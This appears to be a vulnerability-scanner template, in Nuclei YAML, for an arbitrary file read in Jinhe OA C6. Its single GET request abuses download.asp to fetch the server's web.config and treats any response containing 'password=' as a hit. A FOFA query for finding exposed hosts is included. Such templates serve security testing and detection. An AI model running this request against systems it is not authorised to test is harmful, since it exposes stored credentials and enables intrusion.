http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body,"<configuration>") && contains(body,"password=")
    - contains(header,"filename=") && contains(header,"application/octet-stream")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'
id: jinhe-oa-c6-lfi
info:
  author: SleepingBag945
  description: 'There is an arbitrary file read vulnerability in Jinhe OA C6 download.jsp
    file, through which an attacker can obtain sensitive information in the server

    '
  metadata:
    fofa-query: "app=\"\u91D1\u548C\u7F51\u7EDC-\u91D1\u548COA\""
    max-request: 1
    verified: true
  name: Jinhe OA C6 download.jsp - Arbitary File Read
  severity: high
  tags: jinhe,lfi,misconfig,vuln
